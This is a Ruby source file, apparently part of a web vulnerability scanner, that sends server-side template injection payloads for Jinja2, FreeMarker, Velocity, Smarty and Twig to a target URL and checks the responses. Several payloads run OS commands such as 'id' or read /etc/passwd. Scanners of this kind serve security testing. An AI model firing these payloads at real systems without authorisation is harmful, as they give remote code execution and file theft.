require 'uri'
require_relative '../utils/network'
require_relative '../utils/colorize'

class TemplateInjection
  PAYLOADS = {
    jinja2: [
      '{{7*7}}',
      '{{config}}',
      '{{self.__dict__}}',
      '{{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}',
      '{{cycler.__init__.__globals__.os.popen("id").read()}}'
    ],
    freemarker: [
      '${7*7}',
      '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}',
      '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
    ],
    velocity: [
      '#set($x=$class.forName("java.lang.Runtime").getRuntime().exec("id"))',
      '$class.forName("java.lang.Runtime").getRuntime().exec("id")'
    ],
    smarty: [
      '{php}echo "test";{/php}',
      '{if phpinfo()}{/if}',
      '{literal}{/literal}'
    ],
    twig: [
      '{{7*7}}',
      '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
    ]
  }

  def self.test(url, template_type = :all)
    vulnerable = false
    types = template_type == :all ? PAYLOADS.keys : [template_type]
    
    types.each do |type|
      PAYLOADS[type].each do |payload|
        begin
          test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
          response = Network.http_request(test_url)
          next unless response
          
          if response.body.include?("49") || response.body.include?("uid=") || response.body.include?("gid=")
            puts Colorize.red("Template injection: #{type}")
            vulnerable = true
          end
        rescue
        end
      end
    end
    
    vulnerable
  end
end

